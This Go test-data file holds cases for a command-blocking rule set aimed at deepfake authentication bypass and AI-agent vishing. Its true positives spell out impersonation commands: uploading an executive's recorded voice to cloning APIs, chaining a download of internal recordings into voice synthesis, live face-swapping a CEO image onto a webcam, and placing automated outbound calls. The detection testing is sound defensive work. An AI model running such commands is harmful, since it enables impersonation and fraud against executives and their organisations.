package testdata

// ---------------------------------------------------------------------------
// AI Deepfake Authentication Bypass — issue #2234
//
// Rules:
//   ts-block-voice-clone-api-egress  (BLOCK, regex)
//   ts-block-deepfake-video-tool     (BLOCK, regex)
//   ts-block-voice-sample-synthesis-chain (BLOCK, stateful)
//
// Taxonomy: credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass
// ---------------------------------------------------------------------------

// DeepfakeVoiceCloneAPIEgressCases covers ts-block-voice-clone-api-egress.
// Catches HTTP calls to external voice-cloning APIs that exfiltrate audio
// samples and return synthetic impersonation audio.
var DeepfakeVoiceCloneAPIEgressCases = []TestCase{
	// --- TRUE POSITIVES ---
	{
		ID:               "TP-DFVC-001",
		Command:          "curl -X POST https://api.elevenlabs.io/v1/voices/abc123/samples -H 'xi-api-key: TOKEN' -F 'audio=@/tmp/ciso.mp3'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "regex",
		Description:      "curl POST to ElevenLabs voice clone endpoint with audio sample upload — must BLOCK",
		Tags:             []string{"tp", "credential-exposure", "deepfake", "voice-clone"},
	},
	{
		ID:               "TP-DFVC-002",
		Command:          "curl -X POST https://api.elevenlabs.io/v1/text-to-speech/clone -d '{\"voice_id\":\"clone\"}'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "regex",
		Description:      "curl POST to ElevenLabs text-to-speech/clone endpoint — must BLOCK",
		Tags:             []string{"tp", "credential-exposure", "deepfake", "voice-clone"},
	},
	{
		ID:               "TP-DFVC-003",
		Command:          "curl -X POST https://api.resemble.ai/v2/clips -H 'Authorization: Bearer TOKEN' -d '{\"speaker_wav\":\"/tmp/target.wav\"}'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "regex",
		Description:      "curl POST to Resemble AI clips endpoint with speaker_wav — must BLOCK",
		Tags:             []string{"tp", "credential-exposure", "deepfake", "voice-clone"},
	},
	// --- TRUE NEGATIVES ---
	{
		ID:               "TN-DFVC-001",
		Command:          "curl https://api.elevenlabs.io/v1/voices",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "regex",
		Description:      "curl GET to ElevenLabs /voices list endpoint — listing, not cloning; must NOT fire voice-clone-api-egress rule (gets AUDIT from network-egress)",
		Tags:             []string{"tn", "safe"},
	},
	{
		ID:               "TN-DFVC-002",
		Command:          "aws polly synthesize-speech --text 'Hello world' --output-format mp3 --voice-id Joanna",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "regex",
		Description:      "AWS Polly standard TTS (no voice cloning, no external API, no speaker_wav) — must NOT fire voice-clone-api-egress rule",
		Tags:             []string{"tn", "safe"},
	},
}

// DeepfakeVideoToolCases covers ts-block-deepfake-video-tool.
// Catches real-time face-swap tool invocations used for video-based
// identity verification bypass.
var DeepfakeVideoToolCases = []TestCase{
	// --- TRUE POSITIVES ---
	{
		ID:               "TP-DFVT-001",
		Command:          "deepfacelive --source-image ./ceo.jpg --target-webcam 0",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "regex",
		Description:      "DeepFaceLive invocation with source-image and target-webcam flags — real-time face swap; must BLOCK",
		Tags:             []string{"tp", "credential-exposure", "deepfake", "face-swap"},
	},
	{
		ID:               "TP-DFVT-002",
		Command:          "python3 SimSwap/test_video_swapface.py --source ciso.jpg --target-video zoom_call.mp4",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "regex",
		Description:      "SimSwap test_video_swapface script with source identity image — face swap for video auth bypass; must BLOCK",
		Tags:             []string{"tp", "credential-exposure", "deepfake", "face-swap"},
	},
	{
		ID:               "TP-DFVT-003",
		Command:          "python faceswap.py convert --input-dir frames/ --output-dir out/ --face-model ./target.pkl",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "regex",
		Description:      "FaceSwap CLI convert subcommand with face-model — produces deepfake video frames; must BLOCK",
		Tags:             []string{"tp", "credential-exposure", "deepfake", "face-swap"},
	},
	// --- TRUE NEGATIVES ---
	{
		ID:               "TN-DFVT-001",
		Command:          "python -m pytest tests/faceswap_utils_test.py",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "regex",
		Description:      "Running tests for faceswap utils — not an invocation of the deepfake tool; must NOT fire deepfake-video-tool rule (gets AUDIT from default policy)",
		Tags:             []string{"tn", "safe"},
	},
	{
		ID:               "TN-DFVT-002",
		Command:          "git clone https://github.com/iperov/DeepFaceLive",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "regex",
		Description:      "git clone of DeepFaceLive repo — cloning, not executing; must NOT fire deepfake-video-tool rule",
		Tags:             []string{"tn", "safe"},
	},
}

// RetellAIVishingCases covers ts-block-retell-ai-vishing-call.
// Catches HTTP calls to Retell AI's outbound call creation endpoint —
// a purpose-built AI agent calling platform with no legitimate use in
// developer/productivity agent sessions.
var RetellAIVishingCases = []TestCase{
	// --- TRUE POSITIVES ---
	{
		ID:               "TP-VISH-001",
		Command:          "curl -X POST https://api.retellai.com/v2/create-phone-call -H 'Authorization: Bearer KEY' -d '{\"from_number\":\"+15551234567\",\"to_number\":\"+15559876543\"}'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/ai-agent-automated-vishing",
		Analyzer:         "regex",
		Description:      "curl POST to Retell AI create-phone-call endpoint — AI agent initiating automated outbound call; must BLOCK",
		Tags:             []string{"tp", "unauthorized-execution", "vishing", "telephony"},
	},
	{
		ID:               "TP-VISH-002",
		Command:          "curl -s -X POST https://api.retellai.com/v2/create-phone-call -d '{\"agent_id\":\"agent_abc123\",\"to_number\":\"+14155552671\",\"from_number\":\"+14155551234\"}'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/ai-agent-automated-vishing",
		Analyzer:         "regex",
		Description:      "curl POST to Retell AI with agent_id and phone numbers — AI agent vishing call; must BLOCK",
		Tags:             []string{"tp", "unauthorized-execution", "vishing", "telephony"},
	},
	{
		ID:               "TP-VISH-003",
		Command:          "wget --post-data '{\"to_number\":\"+1555\"}' https://api.retellai.com/v2/create-phone-call",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/ai-agent-automated-vishing",
		Analyzer:         "regex",
		Description:      "wget POST to Retell AI create-phone-call — outbound call initiation via wget; must BLOCK",
		Tags:             []string{"tp", "unauthorized-execution", "vishing", "telephony"},
	},
	// --- TRUE NEGATIVES ---
	{
		ID:               "TN-VISH-001",
		Command:          "curl https://api.retellai.com/v2/list-agents",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/ai-agent-automated-vishing",
		Analyzer:         "regex",
		Description:      "curl GET to Retell AI list-agents endpoint — read-only, not call initiation; vishing rule must NOT fire",
		Tags:             []string{"tn", "safe"},
	},
	{
		ID:               "TN-VISH-002",
		Command:          "grep -r 'retellai.com' ./docs/telephony-integrations.md",
		ExpectedDecision: "ALLOW",
		Classification:   "TN",
		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/ai-agent-automated-vishing",
		Analyzer:         "regex",
		Description:      "grep for retellai.com in docs — reading documentation, not making a call; vishing rule must NOT fire",
		Tags:             []string{"tn", "safe"},
	},
}

// TwilioCLIVishingCases covers ts-audit-twilio-cli-outbound-call.
// Catches Twilio CLI call creation commands in agent sessions — dual-use
// telephony that warrants human review in automated contexts.
var TwilioCLIVishingCases = []TestCase{
	// --- TRUE POSITIVES ---
	{
		ID:               "TP-TWILCLI-001",
		Command:          "twilio api:core:calls:create --from=+15551234567 --to=+15559876543 --url=http://demo.twilio.com/docs/voice.xml",
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/ai-agent-automated-vishing",
		Analyzer:         "regex",
		Description:      "Twilio CLI api:core:calls:create — programmatic outbound call initiation; must AUDIT",
		Tags:             []string{"tp", "unauthorized-execution", "vishing", "telephony"},
	},
	{
		ID:               "TP-TWILCLI-002",
		Command:          "twilio calls:create --from=+15551234567 --to=+15559876543 --twiml='<Response><Say>Hello</Say></Response>'",
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/ai-agent-automated-vishing",
		Analyzer:         "regex",
		Description:      "Twilio CLI calls:create shorthand — outbound call with inline TwiML; must AUDIT",
		Tags:             []string{"tp", "unauthorized-execution", "vishing", "telephony"},
	},
	// --- TRUE NEGATIVES ---
	{
		ID:               "TN-TWILCLI-001",
		Command:          "twilio phone-numbers:list",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/ai-agent-automated-vishing",
		Analyzer:         "regex",
		Description:      "Twilio CLI phone-numbers:list — listing numbers, not creating a call; vishing call rule must NOT fire",
		Tags:             []string{"tn", "safe"},
	},
	{
		ID:               "TN-TWILCLI-002",
		Command:          "twilio api:core:calls:list",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/ai-agent-automated-vishing",
		Analyzer:         "regex",
		Description:      "Twilio CLI calls:list — read-only call history, not creating a call; vishing call rule must NOT fire",
		Tags:             []string{"tn", "safe"},
	},
}

// DeepfakeVoiceSampleSynthesisChainCases covers ts-block-voice-sample-synthesis-chain.
// Catches the compound-command attack chain: audio retrieval + voice synthesis API call.
var DeepfakeVoiceSampleSynthesisChainCases = []TestCase{
	// --- TRUE POSITIVES ---
	{
		ID:               "TP-DFCHAIN-001",
		Command:          "curl -o /tmp/ciso.mp3 https://internal.example.com/recordings/ciso-allhands.mp3 && curl -X POST https://api.elevenlabs.io/v1/text-to-speech/clone -d '{\"speaker_wav\":\"/tmp/ciso.mp3\"}'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "stateful",
		Description:      "Audio retrieval (curl .mp3) followed by ElevenLabs voice clone API call — full deepfake auth chain; must BLOCK",
		Tags:             []string{"tp", "credential-exposure", "deepfake", "stateful", "chain"},
	},
	{
		ID:               "TP-DFCHAIN-002",
		Command:          "wget -O /tmp/target.wav https://cdn.example.com/voice-samples/cto.wav && curl -X POST https://api.resemble.ai/v2/clips -d '{\"speaker_wav\":\"/tmp/target.wav\"}'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "stateful",
		Description:      "Audio retrieval (wget .wav) followed by Resemble AI clips API call — full deepfake auth chain; must BLOCK",
		Tags:             []string{"tp", "credential-exposure", "deepfake", "stateful", "chain"},
	},
	// --- TRUE NEGATIVES ---
	{
		ID:               "TN-DFCHAIN-001",
		Command:          "curl -o /tmp/podcast.mp3 https://podcast.example.com/ep42.mp3",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "stateful",
		Description:      "curl downloading an mp3 podcast without a subsequent voice synthesis API call — single step, no chain; must NOT fire stateful chain rule",
		Tags:             []string{"tn", "safe"},
	},
	{
		ID:               "TN-DFCHAIN-002",
		Command:          "ffmpeg -i input.mp4 output.wav",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "credential-exposure/mfa-bypass/ai-deepfake-authentication-bypass",
		Analyzer:         "stateful",
		Description:      "ffmpeg format conversion (mp4 to wav) without chaining to a voice synthesis API — legitimate media processing; must NOT fire stateful chain rule (gets AUDIT from default policy)",
		Tags:             []string{"tn", "safe"},
	},
}
